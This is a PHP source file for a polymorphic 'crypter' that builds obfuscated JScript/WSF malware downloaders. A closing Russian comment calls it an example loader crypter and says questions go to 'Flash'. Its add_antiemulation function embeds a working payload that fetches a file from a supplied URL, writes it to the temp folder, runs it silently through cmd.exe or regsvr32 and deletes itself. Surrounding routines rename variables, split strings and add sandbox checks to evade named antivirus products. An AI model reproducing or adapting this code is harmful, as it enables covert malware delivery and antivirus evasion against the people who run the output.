<?php
class tcrypter {
    private function intelectic_string ($min, $max, $ints_use = false) {
        $length = rand($min, $max);
        $vowels = 'aeiouy';
        $unspoken = 'bcdfghjklmnpqrstvwxz';
        $digits = '01234567890';
        // set lengths
        $vowels_length = strlen($vowels)-1;
        $unspoken_length = strlen($unspoken)-1;
        $digits_length = strlen($digits)-1;
        $string = '';
        // set status variable
        $use = rand(1,2);
        for ($i = 0; $i < $length; $i++) {
            switch($use) {
                case 1:
                    // vowels section
                    $string .= $vowels[rand(0,$vowels_length)];
                    //set new use
                    $use = 2;
                    break;
                case 2:
                    // unspoken section, set use one or two unspoken
                    $unspoken_random = rand(1,2);
                    if($unspoken_random == 1) {
                        $string .= $unspoken[rand(0, $unspoken_length)];
                    }else{
                        $string .= $unspoken[rand(0, $unspoken_length)].$unspoken[rand(0, $unspoken_length)];
                    }
                    // set new use
                    $use = 1;
                    break;
            }
        }
        if($ints_use) {
            $string .= $digits[rand(0, $digits_length)];
        }
        return $string;
    }

    private function create_micro_array ($content, $count = false) {
        $last = substr($content, -1);
        $first = substr($content, 0, 1);
        $mini = substr($content, 1, -1);
        $content = str_replace("\\", '\\\\', $content);
        //if($first == '"') {
        //    $content = $first.str_replace('"', '\"', $mini).$last;
        //}
        //if($first == "'") {
        //    $content = $first.str_replace("'", '\'', $mini).$last;
        //    $content = str_replace("\\", '\\\\', $content);
        //}
        $array = '[';
        if($count) {
            $counter = rand($count['min'], $count['max']);
        }else{
            $counter = rand(5, 7);
        }
        $pos = rand(0, $counter-1);
        $lenghter = 0;
        $pos_name = '';
        $used = array();
        while(1) {
            if($lenghter == $counter) break;
            if(($lenghter+1) == $counter) {
                $com = '';
            }else{
                $com = ', ';
            }
            if($pos == $lenghter) {
                $array .= $content.''.$com;
                $pos_name = $lenghter;
            }else{
                $string = 'String';
                $array .= $string.$com;
            }
            $lenghter++;
        }
        $array .= "]";
        $result = array();
        $result['code'] = $array;
        $result['callback'] = $pos_name;
        return $result;
    }

    private function create_array ($content, $int = true, $string= true) {
        $last = substr($content, -1);
        $first = substr($content, 0, 1);
        $mini = substr($content, 1, -1);
        $content = str_replace("\\", '\\\\', $content);
        if($first == '"') {
            $content = $first.str_replace('"', '\"', $mini).$last;
        }
        if($first == "'") {
            $content = $first.str_replace("'", '\'', $mini).$last;
            $content = str_replace("\\", '\\\\', $content);
        }
        $array = '{';
        $counter = rand(10, 11);
        $pos = rand(0, $counter-1);
        $indexer = '';
        $lenghter = 0;
        $used = array();
        while(1) {
            if($lenghter == $counter) break;
            if(($lenghter+1) == $counter) {
                $com = '';
            }else{
                $com = ', ';
            }
            //if(rand(1,2) == 1) {
            $object_name = '';
            while(1) {
                $object_name = $this->intelectic_string(5,6);
                if(!in_array($object_name, $used) && !in_array($object_name, array('if', 'do', 'in', 'try', 'for', 'var', 'enum', 'eval', 'catch', 'new', 'case', 'break', 'switch'))) {
                    $used[] = $object_name;
                    break;
                }
            }
            //}else{
             //   $object_name = rand(10, 200000);
            //}
            if($pos == $lenghter) {
                //$array .= $object_name.':'.$content.$com;
                //$indexer = $object_name;
                $var_name = $this->intelectic_string(4,6);
                //$micro_arr = $this->create_micro_array($content);
                $obj_name = $this->intelectic_string(4, 6);
                $rand = $this->intelectic_string(4, 6);
                $rand2 = $this->intelectic_string(4, 6);
                $array .= $object_name.': function ('.$rand.', '.$rand2.') { var '.$var_name.' = {'.$obj_name.': '.$content.'}.'.$obj_name.'; return '.$var_name.'; }'.$com;
                $method_name = $object_name;
            }else{
                if($int && $string) {
                    $method = 2;
                }else if($int) {
                    $method = 1;
                }else if($string) {
                    $method = 2;
                }
                switch($method) {
                    case 1:
                        //$string = rand(1000, 9999);
                        $string = "'".$this->intelectic_string(2,4, rand(0,1))."'";
                        break;
                    case 2:
                        $string = '"'.$this->intelectic_string(2,3).'"';
                        //$string = rand(1000, 9999);
                        break;
                }
                $array .= $object_name.':'.$string.$com;
            }
            $lenghter++;
        }
        // last method
        //$method_name = $this->intelectic_string(5,8);
        //$array .= ','.$method_name.': function () { return this.'.$indexer.'; }';

        $array .= '}';
        $result = array();
        $result['code'] = $array;
        $result['indexer'] = $method_name;
        return $result;
    }
    private function create_variable ($content) {
        $result = array();
        $var_name = $this->intelectic_string(4, 9, rand(1,2));
        $result['code'] = 'var '.$var_name.' = '.$content.';';
        $result['var_name'] = $var_name;
        return $result;
    }
    private function inner_string_crypt ($input) {
        $code = '';
        $returner = '';
        $method = rand(1,2);
        switch($method) {
            // ARRAY METHODS
            // Detect by 9 av group
            case 0:
                $array = $this->create_array($input);
                $var_name = $this->intelectic_string(8, 12, false);
                $code = 'var '.$var_name.' = '.$array['code'].';';
                $returner = 'return '.$var_name.'.'.$array['indexer'].';';
                break;

            case 1:
                $array = $this->create_micro_array($input);
                $var_name = $this->intelectic_string(4, 7, rand(1,2));
                $var_name2 = $this->intelectic_string(4, 7, rand(1,2));
                $code = 'var '.$var_name.' = '.$array['code'].';';
                $code .= 'var '.$var_name2.' = '.$var_name.'.'.$array['indexer'].';';
                $returner = 'return '.$var_name2.';';
                break;
            case 2:
                $array = $this->create_micro_array($input);
                $returner = 'return '.$array['code'].'.'.$array['indexer'].';';
                break;
        }
        return array(
            'code' => $code,
            'return' => $returner
        );
    }
    private function create_function ($content, $crypt = true, $after_mix = false) {
        $result = array();
        $function_name = $this->intelectic_string(4, 9, rand(1,2));
        $var = $this->intelectic_string(4, 9, rand(1,2));
        if($crypt) $method = 2; else $method = 2;
        if($after_mix) $method = 1;
        switch($method) {
            case 1:
                // standart
                //$content = implode(' + ', $content);
                $function_content = "var ".$var." = ".$content.";";
                $function_returener = "return ".$var.";";
                break;
            case 2:
                // inner crypt
                $inner = $this->inner_string_crypt($content);
                $function_content = $inner['code'];
                $function_returener = $inner['return'];
                break;
            case 3:
                // after mix
                if(count($content) < 2) {
                    $function_content = 'var '.$var.' = '.$content[0].';';
                    $function_returener = 'return '.$var.';';
                }else{
                    $var2 = $this->intelectic_string(4, 9, rand(1,2));
                    $stopper = rand(1, count($content)-2);
                    $indexer = 0;
                    $res_content = 'var '.$var.' = ';
                    $first = true;
                    foreach($content as $one) {
                        if($indexer == $stopper) {
                            // use next var
                            $res_content .= '; var '.$var2.' = '.$one;

                        }else{
                            // use this var
                            if($first) {
                                $plus = '';
                                $first = false;
                            } else $plus = '+';
                            $res_content .= $plus.$one;
                        }
                        $indexer++;
                    }
                    $var3 = $this->intelectic_string(4, 9, rand(1,2));
                    $res_content .= '; var '.$var3.' = '.$var.'+'.$var2.';';
                    $function_content = $res_content;
                    $function_returener = 'return '.$var3.';';
                }
                break;
        }
        $function_callback =  $function_name.'()';
        $code = "function ".$function_name." () {
           ".$function_content."
           ".$function_returener."
        }";
        $result = array(
            'code' => $code,
            'callback' => $function_callback
        );
        return $result;
    }
    private function this_rechange ($code) {
        $stack = array();
        $top_stack = array();
        //$this_function = $this->create_function('this');
        //$variable = $this->create_variable($this_function['callback']);
        //$top_stack[] = $this_function['code'];
        //$stack[] = $variable['code'];

        //$code = str_replace('this', $variable['var_name'], $code);

        //$micro_arr = $this->create_micro_array('this');

        //$global_micro_arr = $this->create_micro_array($micro_arr['code'].'['.$micro_arr['callback'].']');

        //$variable = $this->create_variable('this');
        //$code = str_replace('this',  $variable['var_name'], $code);
        //$stack[] = $variable['code'];
        return array(
            'stack' => $stack,
            'top_stack' => $top_stack,
            'code' => $code
        );
    }
    private function this_smooth_rechange ($code) {
        preg_match_all('/([a-z0-9]{3,16}\[([a-zA-Z0-9"]{1,8})\](?:\[[a-zA-Z"]+\]|))[\s]{0,10}\=/', $code, $result);
        // doc: [0] - match = , [1] - match only, [2] - match only "var"
        $indexer = 0;
        $used = array();
        foreach($result[1] as $one) {
            $method = 1;
            $var = str_replace('"', '', $result[2][$indexer]);
            switch($method) {
                case 1:
                    // change to variable
                    if(in_array($one, $used)) continue;
                    $var_name = $this->intelectic_string(5, 8, rand(1,2));
                    $code = str_replace($one, $var_name, $code);
                    $code = str_replace($var, $var_name, $code);
                    $used[] = $one;
                    break;
            }
            $indexer++;
        }
        return $code;
    }
    private function strings_encrypt ($code) {
        // step1: encrypt string.
        // step2: move string.
        preg_match_all('/\"([0-9a-zA-Z\>\-\=\~\?\/\s\.\:\_\@\(\)\<\>\&\!\;\'\$\+\,\}\{\\\\]+)\"/', $code, $result);
        // doc: [0] - "string", [1] - string
        $code_stack = array();
        $top_stack = array();
        $indexer = 0;
        $used = array();
        foreach($result[1] as $one) {
            $full_string = $result[0][$indexer];
            if(in_array($full_string, $used)) {
                $indexer++;
                continue;
            }
            $split_string = str_split($one, 3);
            $result_string = array();
            foreach($split_string as $one_splitted) {
                $one_splitted = str_replace("\\", '\\\\', $one_splitted);
                $method = 2;
                switch($method) {
                    case 3:
                        $result_string[] = '"'.$one_splitted.'"';
                        break;
                    case 1:
                        $var_name = $this->intelectic_string(4, 5);
                        $one_array = $this->create_micro_array('"'.$one_splitted.'"', array('min'=> 8, 'max'=> 10));
                       // $code_stack[] = 'var '.$var_name.' = '.$one_array['code'].'; ';
                        $array = $this->create_micro_array($one_array['callback']);
                        $code_stack[] = 'var '.$var_name.' = '.$array['code'].'; ';
                        $top_var = $this->intelectic_string(4, 6);
                        $top_stack[] = 'var '.$top_var.' = '.$one_array['code'].';';
                        $result_string[] = $top_var.'['.$var_name.'['.$array['callback'].']]';
                        break;
                    case 0:
                        $var_name = $this->intelectic_string(4, 6);
                        $fcode = 'var '.$var_name.' = function () {
                        return "'.$one_splitted.'"'.';
                        }';
                        $code_stack[] = $fcode;
                        $result_string[] = $var_name;
                        break;

                    case 0:
                        $array = $this->create_micro_array('"'.$one_splitted.'"');
                        $var_name = $this->intelectic_string(4, 6);
                        $code_stack[] = 'var '.$var_name." = ".$array['code'].';';
                        $result_string[] = $var_name.'['.$array['callback'].']';
                        break;
                    case 3:
                        $var_name = $this->intelectic_string(4, 6);
                        $code_stack[] = 'var '.$var_name.' = "'.$one_splitted.'";';
                        $result_string[] = $var_name;
                        break;
                    case 2:
                        $function_name = $this->intelectic_string(4, 6);
                        $var_name = $this->intelectic_string(4, 6);

                        //$array = $this->create_micro_array('"'.$one_splitted.'"');

                        $callback_var_name = $this->intelectic_string(4, 6);

                        $tvar = $this->intelectic_string(4, 6);
                        $fcode = $function_name.' = function  ('.$callback_var_name.') {
                        '.$this->intelectic_string(4, 6).' = Math.PI;
                        '.$tvar.' = "'.$one_splitted.'";
                        '.$var_name.' = ['.$tvar.'];
                        return '.$var_name.'[0];
                        }';
                        $code_stack[] = $fcode;
                        $result_string[] = $function_name.'(NaN)';
                        break;
                }
            }
/*
            $method = 1;
            switch($method) {
                case 1:
                    // create for result string stack
                    $result_string = implode(' + ', $result_string);
                    $variable  = $this->create_function($result_string, false, true);


                    //$var = $this->create_variable($variable['callback']);
                   // $top_stack[] = $variable['code'].$var['code'];

                    $result_string = $variable['callback'];

                    break;
                case 2:
                    $result_string = implode(' + ', $result_string);
                    //$array = $this->create_array($result_string);
                    $variable = $this->create_variable($result_string);
                    $top_stack[] = $variable['code'];
                    $result_string = $variable['var_name'];
                    break;
            }
*/

            $result_string = implode(' + ', $result_string);

            /*
            $array = $this->create_micro_array($result_string);



            $function_name = $this->intelectic_string(4, 6);
            $var_name = $this->intelectic_string(4, 6);

            $fcode = 'function '.$function_name.' () {
                        var '.$this->intelectic_string(4, 6).' = "'.$this->intelectic_string(5, 7).'";
                        var '.$var_name.' = '.$array['code'].';
                        var '.$this->intelectic_string(4, 6).' = "'.$this->intelectic_string(5, 7).'";
                        return '.$var_name.'['.$array['callback'].']'.';
                        }';
            $top_stack[] = $fcode;

            */
            $code = str_replace($full_string, $result_string, $code);
            $used[] = $full_string;
            $indexer++;
        }
        shuffle($code_stack);
        shuffle($top_stack);
        $result = array(
            'code' => $code,
            'stack' => $code_stack,
            'top_stack' => $top_stack
        );
        return $result;
    }
    private function add_antiemulation ($code, $url, $runner, $sd) {
        // nano object create protection emulator
        if($sd == 'yes') {
            $sd_content = '|-|this["X3"]= this["as1"]["deleteFile"](xre);';
        }else{
            $sd_content = '';
        }
        $detected_proactive = array(
            'b3' => 'this["wseT"]= this["WScript"];|-|this["as1"]= wseT["CreateObject"]("Scripting.FileSystemObject");|-|this["as2"]= wseT["CreateObject"]("WScript.Shell" );|-|this["as3"]= wseT["CreateObject"]("MSXML2.XMLHTTP");|-|this["as4"]= wseT["CreateObject"]("ADODB.Stream");|-|this["fs1"]= this["as1"]["GetSpecialFolder"]("2");|-|this["fs2"]= this["as1"]["GetTempName"]();|-|this["X3"]= this["as3"]["open"]("GET", "'.$url.'", "0");|-|this["X3"]= this["as3"]["send"]();|-|this["as4"]["type"] = "1";|-|this["ole12"]= this["as3"]["ResponseBody"];|-|this["xre"]= wseT["ScriptFullName"];|-|this["X3"]= this["as4"]["Open"]();|-|this["X3"]= this["as4"]["Write"](ole12);|-|this["X3"]= this["as4"]["SaveToFile"](fs1+fs2);|-|this["X3"]= this["as4"]["Close"]();|-|this["X3"]= this["as2"]["run"]("'.$runner.'"+fs1+fs2, "0");'.$sd_content // kasper and avg
        );
        $var_name = $this->intelectic_string(5,8, rand(0,1));
        //$stack = 'var '.$var_name.' = new Function ("return ScriptEngineMinorVersion() > 2")();';


        rand(1, 0) == 0 ? $trash = rand(-1000, 1000) : $trash = '"'.$this->intelectic_string(2, 3).'"';
        //$this->temp_stack[] = 'var '.$var_name.' = [WScript][0];';

        $active_arr = $this->create_micro_array('WScript');

        $function = $this->create_micro_array('Function');
        $function_var_name = $this->intelectic_string(4, 6);
        $this->temp_stack[] = 'var '.$function_var_name.' = '.$function['code'].'['.$function['callback'].'];';


        $bypass_3 = '
        var mist =  eval("WScript")["CreateObject"]("Scripting.FileSystemObject");
        aronse = new '.$function_var_name.'("var path = \'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\';  if(mist.FileExists(path) && typeof mist.GetExtensionName(path) == \'string\') return true; else return false;")();
        if(aronse) {
%CODE%
}'; // ??????? ????????????? ????? ??? ? ???????????
        foreach($detected_proactive as $bypass_type => $one_proactive) {
            switch($bypass_type) {
                case 'b3':
                    $bypass = $bypass_3;
                    break;
            }
            $parsed = explode('|-|', $one_proactive);
            if(count($parsed) > 1) {
                $one_proactive = '';
                $index = 0;
                $summ = count($parsed) - 1;
                $last = '';
                foreach($parsed as $pars) {
                    if($summ == $index) {
                        $last = $pars;
                        $one_proactive .= $pars;
                        break;
                    }
                    $one_proactive .= $pars;
                    $code = str_replace($pars, '', $code);
                    $index++;
                }
                $bypass_code = str_replace('%CODE%', $one_proactive, $bypass);
                $code = str_replace($last, $bypass_code, $code);
            }else{
                $bypass_code = str_replace('%CODE%', $one_proactive, $bypass);
                $code = str_replace($one_proactive, $bypass_code, $code);
            }
        }
        return array(
            'code' => $code,
            'stack' => $stack
        );
    }
    private function set_settings ($url, $file_type, $sd, $launch_alert, $launch_message, $code) {
        // url
        $code = str_replace('!URL!', $url, $code);
        // set file type
        switch($file_type) {
            case 'dll':
                $runner = "regsvr32.exe /s ";
                break;
            case 'exe':
                $runner = "cmd.exe /c ";
                break;
            default:
                $runner = "cmd.exe /c ";
                break;
        }
        $code = str_replace('!RUNNER_METHOD!', $runner, $code);
        // delete after run
        switch($sd) {
            case 'yes':
                $deleter = 'this["X3"]= this["as1"]["deleteFile"](xre);';
                break;
            case 'no':
                $deleter = '';
                break;
            default:
                $deleter = 'this["X3"]= this["as1"]["deleteFile"](xre);';
                break;
        }
        $code = str_replace('DELETE_AFTER;', $deleter, $code);
        // alert message
        switch($launch_alert) {
            case 'yes':
                $lmessage = 'this["wseT"]["echo"]("'.$launch_message.'");';
                break;
            case 'no':
                $lmessage = '';
                break;
            default:
                $lmessage = '';
                break;
        }
        $code = str_replace('ALERT_MESSAGE;', $lmessage, $code);
        return array(
            'code' => $code,
            'runner' => $runner
        );
    }
    private function rename_variables ($code) {
        preg_match_all('/var[\s]([a-zA-Z\?_]+)/', $code, $result);
        //[0] - var varname, [1] - varname
        foreach($result[1] as $one) {
            $new_name = $this->intelectic_string(4,8, rand(0,1));
            $code = str_replace($one, $new_name, $code);
        }
        return $code;
    }
    private function add_random_trash () {
        $result = '';
        $count = rand(1, 2);
        $counter = 0;
        while(1) {
            if($count == $counter) break;
            $array = $this->create_micro_array('"'.$this->intelectic_string(3, 4).'"');
            $result .= 'var '.$this->intelectic_string(4, 6).' = '.$array['code'].'['.$array['callback'].'];';
            $counter++;
        }
        return $result;
    }
    private function randomize_emulation_function ($code) {
        preg_match_all('/(new[\s]+Function(?:.*)\(\))/', $code, $result);
        foreach($result[0] as $function) {
            $array = $this->create_micro_array($function);
            $new_string = $array['code'].'['.$array['callback'].']';
            //$trash = $this->add_random_trash();
            $code = str_replace($function, $new_string, $code);
        }
        return $code;
    }
    public function build ($file_type, $url, $sd, $launch_alert, $launch_message) {
        $code = file_get_contents('includes/crypters/tcrypter/code.js');
        $this->temp_stack = array();
        $code = $this->set_settings($url, $file_type, $sd, $launch_alert, $launch_message, $code);
        $runner = $code['runner'];
        $code = $code['code'];
        $code = $this->add_antiemulation($code, $url, $runner, $sd);
        $emulation_stack = array();
        $code = $code['code'];
        $code = $this->rename_variables($code);
        $code = $this->this_rechange ($code);
        $stack_rechange = $code['stack'];
        $this_top_stack = $code['top_stack'];
        $code = $code['code'];
        $code = $this->this_smooth_rechange($code);
        $code = $this->strings_encrypt($code);
        $strings_stack = $code['stack'];
        $strings_top_stack = $code['top_stack'];
        $code = $code['code'];
        $global_stack = array_merge($this->temp_stack, $stack_rechange, $strings_stack, $emulation_stack);
        $top_stack = array_merge($strings_top_stack, $this_top_stack);
        shuffle($global_stack);
        shuffle($top_stack);
        $global_stack = implode("\n", $global_stack);
        $top_stack = implode("\n", $top_stack);
        $result_code = $global_stack.$top_stack.$code;
        $result_code = $this->randomize_emulation_function($result_code);
        //$this_array = $this->create_micro_array('this');
        //$result_code = str_replace('this', $this_array['code'].'['.$this_array['callback'].']', $result_code);
        return $result_code;
    }
    // added api callers

    private function format_source ($source) {
        return Formatter::formatJavascript($source);
        //return format_code_2($source);
    }
    public function generate_code ($file_type, $url, $sd, $launch_alert, $launch_message, $reserve_use, $reserve_link) {
        // WARNING! RESERVE NOT SUPPORTED!
        return $code = $this->format_source ($this->build($file_type, $url, $sd, $launch_alert, $launch_message));
    }
    private function generate_wsf_code ($file_type, $url, $sd, $launch_alert, $launch_message, $reserve_use, $reserve_link) {
        $code = '<job id="'.rand(1000,9999).'"><script language="JScript">';
        $code .= $this->generate_code($file_type, $url, $sd, $launch_alert, $launch_message, $reserve_use, $reserve_link);
        $code .= '</script></job>';
        return $code;
    }
    public function crypter_return_code ($file_type, $url, $output_format, $sd, $launch_alert, $launch_message, $reserve_use, $reserve_link) {
        switch($output_format) {
            case 'wsf':
                $result = $this->generate_wsf_code($file_type, $url, $sd, $launch_alert, $launch_message, $reserve_use, $reserve_link);
                break;
            default:
                $result = $this->generate_code($file_type, $url, $sd, $launch_alert, $launch_message, $reserve_use, $reserve_link);
                break;
        }
        return $result;
    }
}
//--------------------
//Пример полиморфного криптора загрузчика.
//В данном примере можно увидеть основные методы обфускации JS кода а так же основные методы создания мусора.
//В данном примере создается JavaScript загрузчик, но по примеру работы с кодом, можно взять и выделить основные способы
//криптования кода, к примеру:
//string.split('n'); ---> string["split"]('n'); ---->
//---
//var a = "split";
//var n = 'n';
//string[a](n);
//------>
//function a () {
//   return 'split';
//}
//function b () {
//   return 'n';
//}
//string[a()](b()); 
//
//По такому принципу происходит криптование всех методов файла и string значений.
//
//Удачи, все вопросы передавай Flash'y.

